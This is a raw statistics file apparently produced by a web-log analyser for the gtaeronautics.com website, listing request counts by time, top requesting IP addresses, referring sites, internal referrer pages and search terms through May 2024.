5	Rr	1	0.000	2024	05	28	01	40
5	Rr	0	0.000	2024	05	28	01	35
5	Rr	0	0.000	2024	05	28	01	30
5	Rr	2	0.000	2024	05	28	01	25
5	Rr	0	0.000	2024	05	28	01	20
5	Rr	0	0.000	2024	05	28	01	15
5	Rr	0	0.000	2024	05	28	01	10
5	Rr	0	0.000	2024	05	28	01	05
5	Rr	1	0.000	2024	05	28	01	00
5	Rr	2	0.000	2024	05	28	00	55
5	Rr	4	0.000	2024	05	28	00	50
5	Rr	2	0.000	2024	05	28	00	45
5	Rr	0	0.000	2024	05	28	00	40
5	Rr	0	0.000	2024	05	28	00	35
5	Rr	1	0.000	2024	05	28	00	30
5	Rr	0	0.000	2024	05	28	00	25
5	Rr	0	0.000	2024	05	28	00	20
5	Rr	0	0.000	2024	05	28	00	15
5	Rr	2	0.000	2024	05	28	00	10
5	Rr	1	0.000	2024	05	28	00	05
5	Rr	0	0.000	2024	05	28	00	00
5	Rr	1	0.000	2024	05	27	23	55
5	Rr	0	0.000	2024	05	27	23	50
5	Rr	1	0.000	2024	05	27	23	45
5	Rr	0	0.000	2024	05	27	23	40
5	Rr	0	0.000	2024	05	27	23	35
5	Rr	0	0.000	2024	05	27	23	30
5	Rr	0	0.000	2024	05	27	23	25
5	Rr	0	0.000	2024	05	27	23	20
5	Rr	0	0.000	2024	05	27	23	15
5	Rr	1	0.000	2024	05	27	23	10
5	Rr	0	0.000	2024	05	27	23	05
5	Rr	0	0.000	2024	05	27	23	00
5	Rr	0	0.000	2024	05	27	22	55
5	Rr	0	0.000	2024	05	27	22	50
5	Rr	0	0.000	2024	05	27	22	45
5	Rr	0	0.000	2024	05	27	22	40
5	Rr	2	0.000	2024	05	27	22	35
5	Rr	6	0.000	2024	05	27	22	30
5	Rr	2	0.000	2024	05	27	22	25
5	Rr	0	0.000	2024	05	27	22	20
5	Rr	0	0.000	2024	05	27	22	15
5	Rr	0	0.000	2024	05	27	22	10
5	Rr	1	0.000	2024	05	27	22	05
5	Rr	0	0.000	2024	05	27	22	00
5	Rr	2	0.000	2024	05	27	21	55
5	Rr	0	0.000	2024	05	27	21	50
5	Rr	0	0.000	2024	05	27	21	45
5	Rr	0	0.000	2024	05	27	21	40
5	Rr	0	0.000	2024	05	27	21	35
5	Rr	0	0.000	2024	05	27	21	30
5	Rr	0	0.000	2024	05	27	21	25
5	Rr	0	0.000	2024	05	27	21	20
5	Rr	1	0.000	2024	05	27	21	15
5	Rr	0	0.000	2024	05	27	21	10
5	Rr	0	0.000	2024	05	27	21	05
5	Rr	0	0.000	2024	05	27	21	00
5	Rr	0	0.000	2024	05	27	20	55
5	Rr	0	0.000	2024	05	27	20	50
5	Rr	0	0.000	2024	05	27	20	45
5	Rr	0	0.000	2024	05	27	20	40
5	Rr	0	0.000	2024	05	27	20	35
5	Rr	0	0.000	2024	05	27	20	30
5	Rr	0	0.000	2024	05	27	20	25
5	Rr	0	0.000	2024	05	27	20	20
5	Rr	0	0.000	2024	05	27	20	15
5	Rr	0	0.000	2024	05	27	20	10
5	Rr	0	0.000	2024	05	27	20	05
5	Rr	0	0.000	2024	05	27	20	00
5	Rr	0	0.000	2024	05	27	19	55
5	Rr	0	0.000	2024	05	27	19	50
5	Rr	2	0.000	2024	05	27	19	45
5	Rr	1	0.000	2024	05	27	19	40
5	Rr	1	0.000	2024	05	27	19	35
5	Rr	0	0.000	2024	05	27	19	30
5	Rr	1	0.000	2024	05	27	19	25
5	Rr	0	0.000	2024	05	27	19	20
5	Rr	0	0.000	2024	05	27	19	15
5	Rr	0	0.000	2024	05	27	19	10
5	Rr	0	0.000	2024	05	27	19	05
5	Rr	3	0.000	2024	05	27	19	00
5	Rr	0	0.000	2024	05	27	18	55
5	Rr	0	0.000	2024	05	27	18	50
5	Rr	0	0.000	2024	05	27	18	45
5	Rr	0	0.000	2024	05	27	18	40
5	Rr	1	0.000	2024	05	27	18	35
5	Rr	0	0.000	2024	05	27	18	30
5	Rr	0	0.000	2024	05	27	18	25
5	Rr	1	0.000	2024	05	27	18	20
5	Rr	1	0.000	2024	05	27	18	15
5	Rr	0	0.000	2024	05	27	18	10
5	Rr	0	0.000	2024	05	27	18	05
5	Rr	0	0.000	2024	05	27	18	00
5	Rr	1	0.000	2024	05	27	17	55
5	Rr	0	0.000	2024	05	27	17	50
5	Rr	1	0.000	2024	05	27	17	45
5	Rr	0	0.000	2024	05	27	17	40
5	Rr	0	0.000	2024	05	27	17	35
5	Rr	0	0.000	2024	05	27	17	30
5	Rr	0	0.000	2024	05	27	17	25
5	Rr	4	0.000	2024	05	27	17	20
5	Rr	0	0.000	2024	05	27	17	15
5	Rr	0	0.000	2024	05	27	17	10
5	Rr	0	0.000	2024	05	27	17	05
5	Rr	0	0.000	2024	05	27	17	00
5	Rr	0	0.000	2024	05	27	16	55
5	Rr	0	0.000	2024	05	27	16	50
5	Rr	0	0.000	2024	05	27	16	45
5	Rr	0	0.000	2024	05	27	16	40
5	Rr	0	0.000	2024	05	27	16	35
5	Rr	0	0.000	2024	05	27	16	30
5	Rr	4	0.000	2024	05	27	16	25
5	Rr	0	0.000	2024	05	27	16	20
5	Rr	0	0.000	2024	05	27	16	15
5	Rr	0	0.000	2024	05	27	16	10
5	Rr	0	0.000	2024	05	27	16	05
5	Rr	1	0.000	2024	05	27	16	00
5	Rr	0	0.000	2024	05	27	15	55
5	Rr	0	0.000	2024	05	27	15	50
5	Rr	1	0.000	2024	05	27	15	45
5	Rr	0	0.000	2024	05	27	15	40
5	Rr	2	0.000	2024	05	27	15	35
5	Rr	36	0.002	2024	05	27	15	30
5	Rr	1	0.000	2024	05	27	15	25
5	Rr	5	0.000	2024	05	27	15	20
5	Rr	2	0.000	2024	05	27	15	15
5	Rr	0	0.000	2024	05	27	15	10
5	Rr	0	0.000	2024	05	27	15	05
5	Rr	0	0.000	2024	05	27	15	00
5	Rr	0	0.000	2024	05	27	14	55
5	Rr	0	0.000	2024	05	27	14	50
5	Rr	1	0.000	2024	05	27	14	45
5	Rr	0	0.000	2024	05	27	14	40
5	Rr	0	0.000	2024	05	27	14	35
5	Rr	0	0.000	2024	05	27	14	30
5	Rr	0	0.000	2024	05	27	14	25
5	Rr	0	0.000	2024	05	27	14	20
5	Rr	0	0.000	2024	05	27	14	15
5	Rr	1	0.000	2024	05	27	14	10
5	Rr	36	0.002	2024	05	27	14	05
5	Rr	0	0.000	2024	05	27	14	00
5	Rr	0	0.000	2024	05	27	13	55
5	Rr	0	0.000	2024	05	27	13	50
5	Rr	1	0.000	2024	05	27	13	45
5	Rr	0	0.000	2024	05	27	13	40
5	Rr	0	0.000	2024	05	27	13	35
5	Rr	2	0.000	2024	05	27	13	30
5	Rr	0	0.000	2024	05	27	13	25
5	Rr	0	0.000	2024	05	27	13	20
5	Rr	0	0.000	2024	05	27	13	15
5	Rr	0	0.000	2024	05	27	13	10
5	Rr	0	0.000	2024	05	27	13	05
5	Rr	2	0.000	2024	05	27	13	00
5	Rr	1	0.000	2024	05	27	12	55
5	Rr	0	0.000	2024	05	27	12	50
5	Rr	1	0.000	2024	05	27	12	45
5	Rr	0	0.000	2024	05	27	12	40
5	Rr	0	0.000	2024	05	27	12	35
5	Rr	0	0.000	2024	05	27	12	30
5	Rr	0	0.000	2024	05	27	12	25
5	Rr	0	0.000	2024	05	27	12	20
5	Rr	0	0.000	2024	05	27	12	15
5	Rr	0	0.000	2024	05	27	12	10
5	Rr	5	0.000	2024	05	27	12	05
5	Rr	1	0.000	2024	05	27	12	00
5	Rr	0	0.000	2024	05	27	11	55
5	Rr	0	0.000	2024	05	27	11	50
5	Rr	3	0.000	2024	05	27	11	45
5	Rr	6	0.000	2024	05	27	11	40
5	Rr	0	0.000	2024	05	27	11	35
5	Rr	0	0.000	2024	05	27	11	30
5	Rr	0	0.000	2024	05	27	11	25
5	Rr	0	0.000	2024	05	27	11	20
5	Rr	0	0.000	2024	05	27	11	15
5	Rr	0	0.000	2024	05	27	11	10
5	Rr	0	0.000	2024	05	27	11	05
5	Rr	0	0.000	2024	05	27	11	00
5	Rr	0	0.000	2024	05	27	10	55
5	Rr	0	0.000	2024	05	27	10	50
5	Rr	0	0.000	2024	05	27	10	45
5	Rr	0	0.000	2024	05	27	10	40
5	Rr	1	0.000	2024	05	27	10	35
5	Rr	0	0.000	2024	05	27	10	30
5	Rr	0	0.000	2024	05	27	10	25
5	Rr	0	0.000	2024	05	27	10	20
5	Rr	0	0.000	2024	05	27	10	15
5	Rr	0	0.000	2024	05	27	10	10
5	Rr	0	0.000	2024	05	27	10	05
5	Rr	0	0.000	2024	05	27	10	00
5	Rr	0	0.000	2024	05	27	09	55
5	Rr	0	0.000	2024	05	27	09	50
5	Rr	1	0.000	2024	05	27	09	45
5	Rr	1	0.000	2024	05	27	09	40
5	Rr	2	0.000	2024	05	27	09	35
5	Rr	0	0.000	2024	05	27	09	30
5	Rr	1	0.000	2024	05	27	09	25
5	Rr	0	0.000	2024	05	27	09	20
5	Rr	0	0.000	2024	05	27	09	15
5	Rr	0	0.000	2024	05	27	09	10
5	Rr	0	0.000	2024	05	27	09	05
5	Rr	1	0.000	2024	05	27	09	00
5	Rr	0	0.000	2024	05	27	08	55
5	Rr	0	0.000	2024	05	27	08	50
5	Rr	0	0.000	2024	05	27	08	45
5	Rr	3	0.000	2024	05	27	08	40
5	Rr	1	0.000	2024	05	27	08	35
5	Rr	0	0.000	2024	05	27	08	30
5	Rr	0	0.000	2024	05	27	08	25
5	Rr	0	0.000	2024	05	27	08	20
5	Rr	1	0.000	2024	05	27	08	15
5	Rr	0	0.000	2024	05	27	08	10
5	Rr	0	0.000	2024	05	27	08	05
5	Rr	0	0.000	2024	05	27	08	00
5	Rr	0	0.000	2024	05	27	07	55
5	Rr	1	0.000	2024	05	27	07	50
5	Rr	0	0.000	2024	05	27	07	45
5	Rr	0	0.000	2024	05	27	07	40
5	Rr	0	0.000	2024	05	27	07	35
5	Rr	0	0.000	2024	05	27	07	30
5	Rr	2	0.000	2024	05	27	07	25
5	Rr	1	0.000	2024	05	27	07	20
5	Rr	0	0.000	2024	05	27	07	15
5	Rr	0	0.000	2024	05	27	07	10
5	Rr	0	0.000	2024	05	27	07	05
5	Rr	0	0.000	2024	05	27	07	00
5	Rr	2	0.000	2024	05	27	06	55
5	Rr	0	0.000	2024	05	27	06	50
5	Rr	0	0.000	2024	05	27	06	45
5	Rr	5	0.000	2024	05	27	06	40
5	Rr	0	0.000	2024	05	27	06	35
5	Rr	0	0.000	2024	05	27	06	30
5	Rr	0	0.000	2024	05	27	06	25
5	Rr	1	0.000	2024	05	27	06	20
5	Rr	1	0.000	2024	05	27	06	15
5	Rr	0	0.000	2024	05	27	06	10
5	Rr	1	0.000	2024	05	27	06	05
5	Rr	1	0.000	2024	05	27	06	00
5	Rr	0	0.000	2024	05	27	05	55
5	Rr	0	0.000	2024	05	27	05	50
5	Rr	0	0.000	2024	05	27	05	45
5	Rr	35	0.002	2024	05	27	05	40
5	Rr	1	0.000	2024	05	27	05	35
5	Rr	6	0.000	2024	05	27	05	30
5	Rr	52	0.003	2024	05	27	05	25
5	Rr	0	0.000	2024	05	27	05	20
5	Rr	0	0.000	2024	05	27	05	15
5	Rr	0	0.000	2024	05	27	05	10
5	Rr	1	0.000	2024	05	27	05	05
5	Rr	0	0.000	2024	05	27	05	00
5	Rr	2	0.000	2024	05	27	04	55
5	Rr	0	0.000	2024	05	27	04	50
5	Rr	0	0.000	2024	05	27	04	45
5	Rr	0	0.000	2024	05	27	04	40
5	*BT	R	945	2023	05	08	18	00
7	Rr	6488	0.336	00	00
7	Rr	6773	0.350	00	05
7	Rr	7100	0.367	00	10
7	Rr	4701	0.243	00	15
7	Rr	5681	0.294	00	20
7	Rr	7241	0.375	00	25
7	Rr	5730	0.296	00	30
7	Rr	7384	0.382	00	35
7	Rr	6084	0.315	00	40
7	Rr	5783	0.299	00	45
7	Rr	6431	0.333	00	50
7	Rr	6247	0.323	00	55
7	Rr	5921	0.306	01	00
7	Rr	5218	0.270	01	05
7	Rr	5158	0.267	01	10
7	Rr	5643	0.292	01	15
7	Rr	6459	0.334	01	20
7	Rr	5884	0.304	01	25
7	Rr	5420	0.280	01	30
7	Rr	5615	0.290	01	35
7	Rr	6182	0.320	01	40
7	Rr	5875	0.304	01	45
7	Rr	6925	0.358	01	50
7	Rr	6085	0.315	01	55
7	Rr	5300	0.274	02	00
7	Rr	5225	0.270	02	05
7	Rr	5243	0.271	02	10
7	Rr	7388	0.382	02	15
7	Rr	5734	0.297	02	20
7	Rr	6309	0.326	02	25
7	Rr	6969	0.360	02	30
7	Rr	6004	0.311	02	35
7	Rr	6112	0.316	02	40
7	Rr	5957	0.308	02	45
7	Rr	6028	0.312	02	50
7	Rr	6398	0.331	02	55
7	Rr	6173	0.319	03	00
7	Rr	5837	0.302	03	05
7	Rr	5772	0.299	03	10
7	Rr	5678	0.294	03	15
7	Rr	6151	0.318	03	20
7	Rr	5831	0.302	03	25
7	Rr	5940	0.307	03	30
7	Rr	5770	0.298	03	35
7	Rr	6347	0.328	03	40
7	Rr	6348	0.328	03	45
7	Rr	7888	0.408	03	50
7	Rr	6572	0.340	03	55
7	Rr	5597	0.289	04	00
7	Rr	6160	0.319	04	05
7	Rr	5955	0.308	04	10
7	Rr	5717	0.296	04	15
7	Rr	5215	0.270	04	20
7	Rr	5631	0.291	04	25
7	Rr	5694	0.295	04	30
7	Rr	5870	0.304	04	35
7	Rr	6954	0.360	04	40
7	Rr	6284	0.325	04	45
7	Rr	6800	0.352	04	50
7	Rr	6668	0.345	04	55
7	Rr	5777	0.299	05	00
7	Rr	5665	0.293	05	05
7	Rr	5348	0.277	05	10
7	Rr	7108	0.368	05	15
7	Rr	6104	0.316	05	20
7	Rr	5610	0.290	05	25
7	Rr	5497	0.284	05	30
7	Rr	5794	0.300	05	35
7	Rr	6057	0.313	05	40
7	Rr	6542	0.338	05	45
7	Rr	5426	0.281	05	50
7	Rr	6029	0.312	05	55
7	Rr	5097	0.264	06	00
7	Rr	6252	0.323	06	05
7	Rr	6175	0.319	06	10
7	Rr	5999	0.310	06	15
7	Rr	4608	0.238	06	20
7	Rr	5247	0.271	06	25
7	Rr	6701	0.347	06	30
7	Rr	6432	0.333	06	35
7	Rr	5293	0.274	06	40
7	Rr	5120	0.265	06	45
7	Rr	5506	0.285	06	50
7	Rr	4491	0.232	06	55
7	Rr	6415	0.332	07	00
7	Rr	4679	0.242	07	05
7	Rr	5106	0.264	07	10
7	Rr	4873	0.252	07	15
7	Rr	5740	0.297	07	20
7	Rr	6091	0.315	07	25
7	Rr	6128	0.317	07	30
7	Rr	5170	0.267	07	35
7	Rr	5041	0.261	07	40
7	Rr	5830	0.302	07	45
7	Rr	4444	0.230	07	50
7	Rr	5324	0.275	07	55
7	Rr	5256	0.272	08	00
7	Rr	5025	0.260	08	05
7	Rr	5294	0.274	08	10
7	Rr	5190	0.268	08	15
7	Rr	5042	0.261	08	20
7	Rr	5316	0.275	08	25
7	Rr	5229	0.270	08	30
7	Rr	5289	0.274	08	35
7	Rr	6250	0.323	08	40
7	Rr	5253	0.272	08	45
7	Rr	4719	0.244	08	50
7	Rr	4746	0.245	08	55
7	Rr	4593	0.238	09	00
7	Rr	5083	0.263	09	05
7	Rr	5237	0.271	09	10
7	Rr	3981	0.206	09	15
7	Rr	5047	0.261	09	20
7	Rr	6629	0.343	09	25
7	Rr	4754	0.246	09	30
7	Rr	6048	0.313	09	35
7	Rr	5908	0.306	09	40
7	Rr	5164	0.267	09	45
7	Rr	4569	0.236	09	50
7	Rr	4599	0.238	09	55
7	Rr	5269	0.273	10	00
7	Rr	4462	0.231	10	05
7	Rr	5195	0.269	10	10
7	Rr	4576	0.237	10	15
7	Rr	5388	0.279	10	20
7	Rr	5493	0.284	10	25
7	Rr	6089	0.315	10	30
7	Rr	5930	0.307	10	35
7	Rr	6405	0.331	10	40
7	Rr	5019	0.260	10	45
7	Rr	6182	0.320	10	50
7	Rr	4959	0.256	10	55
7	Rr	6719	0.348	11	00
7	Rr	5729	0.296	11	05
7	Rr	5403	0.279	11	10
7	Rr	5456	0.282	11	15
7	Rr	5030	0.260	11	20
7	Rr	6409	0.331	11	25
7	Rr	7125	0.369	11	30
7	Rr	4673	0.242	11	35
7	Rr	5127	0.265	11	40
7	Rr	5281	0.273	11	45
7	Rr	4831	0.250	11	50
7	Rr	4889	0.253	11	55
7	Rr	5664	0.293	12	00
7	Rr	6145	0.318	12	05
7	Rr	5728	0.296	12	10
7	Rr	5075	0.262	12	15
7	Rr	5181	0.268	12	20
7	Rr	5550	0.287	12	25
7	Rr	5325	0.275	12	30
7	Rr	5675	0.294	12	35
7	Rr	5000	0.259	12	40
7	Rr	5458	0.282	12	45
7	Rr	6228	0.322	12	50
7	Rr	5728	0.296	12	55
7	Rr	6347	0.328	13	00
7	Rr	5221	0.270	13	05
7	Rr	6166	0.319	13	10
7	Rr	6588	0.341	13	15
7	Rr	6765	0.350	13	20
7	Rr	6046	0.313	13	25
7	Rr	5731	0.296	13	30
7	Rr	6511	0.337	13	35
7	Rr	6762	0.350	13	40
7	Rr	5154	0.267	13	45
7	Rr	6587	0.341	13	50
7	Rr	5831	0.302	13	55
7	Rr	7960	0.412	14	00
7	Rr	6803	0.352	14	05
7	Rr	7127	0.369	14	10
7	Rr	8264	0.427	14	15
7	Rr	7939	0.411	14	20
7	Rr	7781	0.402	14	25
7	Rr	7800	0.403	14	30
7	Rr	7744	0.401	14	35
7	Rr	7355	0.380	14	40
7	Rr	7345	0.380	14	45
7	Rr	6306	0.326	14	50
7	Rr	7826	0.405	14	55
7	Rr	7760	0.401	15	00
7	Rr	7278	0.376	15	05
7	Rr	7614	0.394	15	10
7	Rr	6789	0.351	15	15
7	Rr	8341	0.431	15	20
7	Rr	7130	0.369	15	25
7	Rr	7813	0.404	15	30
7	Rr	7554	0.391	15	35
7	Rr	9015	0.466	15	40
7	Rr	6668	0.345	15	45
7	Rr	8488	0.439	15	50
7	Rr	9308	0.481	15	55
7	Rr	8567	0.443	16	00
7	Rr	9388	0.486	16	05
7	Rr	9634	0.498	16	10
7	Rr	9650	0.499	16	15
7	Rr	8903	0.460	16	20
7	Rr	8590	0.444	16	25
7	Rr	8158	0.422	16	30
7	Rr	9026	0.467	16	35
7	Rr	7876	0.407	16	40
7	Rr	8913	0.461	16	45
7	Rr	9280	0.480	16	50
7	Rr	7719	0.399	16	55
7	Rr	9395	0.486	17	00
7	Rr	9993	0.517	17	05
7	Rr	9013	0.466	17	10
7	Rr	7953	0.411	17	15
7	Rr	9103	0.471	17	20
7	Rr	8675	0.449	17	25
7	Rr	9325	0.482	17	30
7	Rr	8263	0.427	17	35
7	Rr	8520	0.441	17	40
7	Rr	8340	0.431	17	45
7	Rr	8462	0.438	17	50
7	Rr	8643	0.447	17	55
7	Rr	10444	0.540	18	00
7	Rr	9149	0.473	18	05
7	Rr	8752	0.453	18	10
7	Rr	9415	0.487	18	15
7	Rr	8016	0.415	18	20
7	Rr	7923	0.410	18	25
7	Rr	8872	0.459	18	30
7	Rr	7498	0.388	18	35
7	Rr	10842	0.561	18	40
7	Rr	8205	0.424	18	45
7	Rr	9938	0.514	18	50
7	Rr	8742	0.452	18	55
7	Rr	9962	0.515	19	00
7	Rr	8444	0.437	19	05
7	Rr	9275	0.480	19	10
7	Rr	8043	0.416	19	15
7	Rr	7513	0.389	19	20
7	Rr	8319	0.430	19	25
7	Rr	8062	0.417	19	30
7	Rr	9690	0.501	19	35
7	Rr	7467	0.386	19	40
7	Rr	9299	0.481	19	45
7	Rr	9389	0.486	19	50
7	Rr	9989	0.517	19	55
7	Rr	8542	0.442	20	00
7	Rr	8545	0.442	20	05
7	Rr	8023	0.415	20	10
7	Rr	7532	0.390	20	15
7	Rr	9532	0.493	20	20
7	Rr	8867	0.459	20	25
7	Rr	8166	0.422	20	30
7	Rr	9027	0.467	20	35
7	Rr	7409	0.383	20	40
7	Rr	8609	0.445	20	45
7	Rr	8885	0.460	20	50
7	Rr	7219	0.373	20	55
7	Rr	8327	0.431	21	00
7	Rr	8118	0.420	21	05
7	Rr	7382	0.382	21	10
7	Rr	7903	0.409	21	15
7	Rr	8202	0.424	21	20
7	Rr	8246	0.427	21	25
7	Rr	6736	0.348	21	30
7	Rr	7753	0.401	21	35
7	Rr	7095	0.367	21	40
7	Rr	8975	0.464	21	45
7	Rr	7991	0.413	21	50
7	Rr	6077	0.314	21	55
7	Rr	6290	0.325	22	00
7	Rr	6528	0.338	22	05
7	Rr	7498	0.388	22	10
7	Rr	7637	0.395	22	15
7	Rr	7631	0.395	22	20
7	Rr	7317	0.378	22	25
7	Rr	7583	0.392	22	30
7	Rr	7725	0.400	22	35
7	Rr	6276	0.325	22	40
7	Rr	7572	0.392	22	45
7	Rr	7361	0.381	22	50
7	Rr	7004	0.362	22	55
7	Rr	7282	0.377	23	00
7	Rr	7072	0.366	23	05
7	Rr	7512	0.389	23	10
7	Rr	8015	0.415	23	15
7	Rr	8684	0.449	23	20
7	Rr	6243	0.323	23	25
7	Rr	5778	0.299	23	30
7	Rr	5623	0.291	23	35
7	Rr	5873	0.304	23	40
7	Rr	5678	0.294	23	45
7	Rr	6267	0.324	23	50
7	Rr	6492	0.336	23	55
o	*f	0R	r
o	lRQ	1	1933339	2950225190	[unresolved numerical addresses]
Z	*f	-20R	r
Z	lRb	1	91011	2.566	66.249
Z	lRb	1	84861	3.582	98
Z	lRb	1	63486	1.794	34
Z	lRb	1	58910	2.524	51
Z	lRb	1	53096	2.025	35
Z	lRb	1	45675	1.401	69
Z	lRb	1	35162	2.897	54
Z	lRb	1	35044	0.506	49
Z	lRb	1	32116	1.170	104
Z	lRb	1	31937	0.000	216.147
Z	lRb	1	31751	0.945	123
Z	lRb	1	29510	2.331	40
Z	lRb	1	26708	1.160	76
Z	lRb	1	26405	0.641	46
Z	lRb	1	25941	2.469	157.55
Z	lRb	1	24392	2.596	70
Z	lRb	1	23509	1.032	52
Z	lRb	1	21682	1.924	207.46
Z	lRb	1	20882	1.539	72
Z	lRb	1	17561	0.443	17
Z	lRb	1	1153700	66.454	[not listed: 9270]
S	*f	-50P	r
S	Rb	4702	0.294	14.33.246.211
S	Rb	4391	0.027	162.55.85.223
S	Rb	3866	0.592	192.234.235.103
S	Rb	3825	0.222	216.244.66.229
S	Rb	3680	0.003	66.249.66.195
S	Rb	3517	0.000	66.249.66.166
S	Rb	3248	0.184	192.99.15.146
S	Rb	3106	0.000	66.249.66.196
S	Rb	2790	0.000	66.249.66.197
S	Rb	2767	0.107	68.66.226.98
S	Rb	2542	0.020	49.7.20.111
S	Rb	2489	0.009	49.7.20.105
S	Rb	2341	0.102	100.43.83.148
S	Rb	2232	0.000	66.249.66.164
S	Rb	2158	0.000	66.249.66.72
S	Rb	2091	0.000	66.249.66.165
S	Rb	1992	0.051	66.249.75.109
S	Rb	1829	0.111	37.59.14.116
S	Rb	1799	0.001	66.249.66.74
S	Rb	1781	0.161	75.98.173.33
S	Rb	1750	0.000	66.249.66.167
S	Rb	1736	0.215	79.125.27.96
S	Rb	1623	0.000	66.249.66.73
S	Rb	1597	0.097	78.155.138.20
S	Rb	1566	0.000	62.194.247.203
S	Rb	1543	0.055	199.21.99.79
S	Rb	1467	0.000	49.7.20.135
S	Rb	1459	0.008	92.249.127.111
S	Rb	1352	0.045	49.7.20.102
S	Rb	1330	0.014	109.102.111.58
S	Rb	1312	0.033	205.203.134.197
S	Rb	1304	0.144	5.196.13.127
S	Rb	1285	0.033	144.76.27.118
S	Rb	1276	0.089	208.115.113.82
S	Rb	1270	0.048	95.108.248.29
S	Rb	1213	0.014	52.35.20.1
S	Rb	1166	0.000	82.16.45.40
S	Rb	1155	0.173	75.98.173.84
S	Rb	1142	0.001	91.207.9.226
S	Rb	1142	0.009	78.129.149.5
S	Rb	1107	0.012	66.249.69.97
S	Rb	1081	0.014	66.249.69.81
S	Rb	1074	0.000	49.7.21.96
S	Rb	1048	0.064	157.90.182.26
S	Rb	1047	0.013	106.38.241.144
S	Rb	1039	0.011	66.249.69.89
S	Rb	1024	0.055	95.108.150.235
S	Rb	1012	0.061	192.99.6.132
S	Rb	959	0.016	52.35.117.102
S	Rb	931	0.000	213.219.247.106
S	Rb	1838183	96.891	[not listed: 113049]
s	*FR	2013	12	18	21	53
s	*LR	2024	05	28	02	52
s	*f	-20R	s
s	lRS	1	606430	1119	http://www.gtaeronautics.com/
s	lRS	1	143226	202	http://gtaeronautics.com/
s	lRS	1	10180	10	https://www.google.com/
s	lRS	1	468	3	http://baidu.com/
s	lRS	1	1781	0	http://www.google.com/
s	lRS	1	1287	0	http://www.baidu.com/
s	lRS	1	1159	0	http://www.trainingindustry.com/
s	lRS	1	623	0	https://www.bing.com/
s	lRS	1	609	0	http://www.mfgpages.com/
s	lRS	1	604	0	http://www.openfos.com/
s	lRS	1	517	0	http://www.topicway.com/
s	lRS	1	462	0	http://anti-crisis-seo.com/
s	lRS	1	420	0	http://122.144.179.12/
s	lRS	1	399	0	https://www.thomasnet.com/
s	lRS	1	395	0	http://uptime.com/
s	lRS	1	362	0	http://semalt.semalt.com/
s	lRS	1	328	0	http://www.bing.com/
s	lRS	1	301	0	http://chimiver.info/
s	lRS	1	286	0	http://google.com/
s	lRS	1	281	0	https://www.google.co.in/
s	lRS	1	51415	11	[not listed: 4442]
f	*FR	2013	12	18	21	53
f	*LR	2024	05	28	02	52
f	*f	-30R	s
f	lRS	1	459523	920	http://www.gtaeronautics.com/
f	lRS	1	90968	174	http://gtaeronautics.com/
f	lRS	1	4987	45	http://www.gtaeronautics.com/contactus.html
f	lRS	1	21211	35	http://www.gtaeronautics.com/aboutus.html
f	lRS	1	11752	20	http://www.gtaeronautics.com/CCT&M.html
f	lRS	1	3470	16	http://www.gtaeronautics.com/consultinga.html
f	lRS	1	3108	11	http://www.gtaeronautics.com/GT100HL RPAS.html
f	lRS	1	9483	10	https://www.google.com/
f	lRS	1	3996	10	http://gtaeronautics.com/aboutus.html
f	lRS	1	9740	9	http://www.gtaeronautics.com/UASFC.html
f	lRS	1	15473	7	http://www.gtaeronautics.com/index.html
f	lRS	1	4881	7	http://www.gtaeronautics.com/GT50T RPAS.html
f	lRS	1	4750	5	http://www.gtaeronautics.com/pna.html
f	lRS	1	3362	5	http://www.gtaeronautics.com/CFMT.html
f	lRS	1	4890	4	http://www.gtaeronautics.com/SRU.html
f	lRS	1	4877	4	http://www.gtaeronautics.com/GT1500 RPAS.html
f	lRS	1	2246	4	http://www.gtaeronautics.com/EMPLOYMENT.html
f	lRS	1	7339	3	http://www.gtaeronautics.com/ConsultingA.html
f	lRS	1	3995	3	http://www.gtaeronautics.com/RD.html
f	lRS	1	3676	3	http://gtaeronautics.com/index.html
f	lRS	1	6975	2	http://www.gtaeronautics.com/GT380 RPAS.html
f	lRS	1	2436	2	http://gtaeronautics.com/ConsultingA.html
f	lRS	1	3602	1	http://www.gtaeronautics.com/IndNews.html
f	lRS	1	13382	0	http://gtaeronautics.com/links.html
f	lRS	1	6471	0	http://www.gtaeronautics.com/compnews.html
f	lRS	1	5904	0	http://gtaeronautics.com/IndNews.html
f	lRS	1	5019	0	http://www.gtaeronautics.com/CompNews.html
f	lRS	1	4850	0	http://gtaeronautics.com/contactus.html
f	lRS	1	2969	0	http://gtaeronautics.com/CCT&M.html
f	lRS	1	2792	0	http://www.gtaeronautics.com/uasfc.html
f	lRS	1	93406	45	[not listed: 5157]
n	*FR	2013	12	19	00	28
n	*LR	2020	10	14	09	11
n	*f	0.500000%Q	s
n	Rq	1	14.716	kit
n	Rq	1	14.716	method
n	Rq	2	29.432	crew
n	Rq	28	7.575	aeronautical
n	Rq	1	14.716	airplane.com
n	Rq	5	73.580	faa
n	Rq	40	95.870	gt
n	Rq	1	14.716	moldings
n	Rq	1	14.716	twin
n	Rq	1	14.716	taranis
n	Rq	2	14.716	installerex
n	Rq	2	14.716	http://gtaeronautics.com/
n	Rq	20	41.767	in
n	Rq	1	14.716	scale
n	Rq	1	14.716	observer
n	Rq	1	14.716	drawing?
n	Rq	2	14.716	is
n	Rq	1	14.716	making
n	Rq	2	29.432	fiber
n	Rq	1	14.716	mitsubishi
n	Rq	1	14.716	fuze
n	Rq	1	14.716	http://www.gtaeronautics.com/indnews.html
n	Rq	92	14.716	semalt.com
n	Rq	1	14.716	consultant
n	Rq	15	58.864	manufacturing
n	Rq	1	14.716	2
n	Rq	1	14.716	base
n	Rq	14	100.631	6
n	Rq	1	14.716	http://gtaeronautics.com/indnews.html
n	Rq	1	14.716	always
n	Rq	28	51.723	engineering
n	Rq	1	14.716	northrop
n	Rq	1	14.716	bandwidth
n	Rq	1	14.716	vegas
n	Rq	3	29.432	basic
n	Rq	1	14.716	qinetiq
n	Rq	1	14.716	tooling
n	Rq	1	14.716	on
n	Rq	1	14.716	heavy
n	Rq	9	12.336	drawings
n	Rq	1	14.716	fia
n	Rq	4	14.716	louis%20vuitton%20fashion%20valley%20phone%20number
n	Rq	3	14.716	llc
n	Rq	3	44.148	rullman
n	Rq	1	14.716	cowling
n	Rq	32	44.148	sale
n	Rq	64	88.295	outlet
n	Rq	1	14.716	rotax
n	Rq	1	14.716	ucav
n	Rq	28	37.007	texan
n	Rq	1	14.716	a
n	Rq	2	14.716	customer
n	Rq	1	14.716	rpa
n	Rq	2	29.432	110cc
n	Rq	30	14.716	designer
n	Rq	20	73.580	www.gtaeronautics.com
n	Rq	1	14.716	work
n	Rq	1	14.716	thomas
n	Rq	1	14.716	engie
n	Rq	1	14.716	qualification
n	Rq	1	14.716	custom
n	Rq	1	14.716	mk3
n	Rq	1	14.716	t
n	Rq	1	14.716	uavs
n	Rq	1	14.716	w
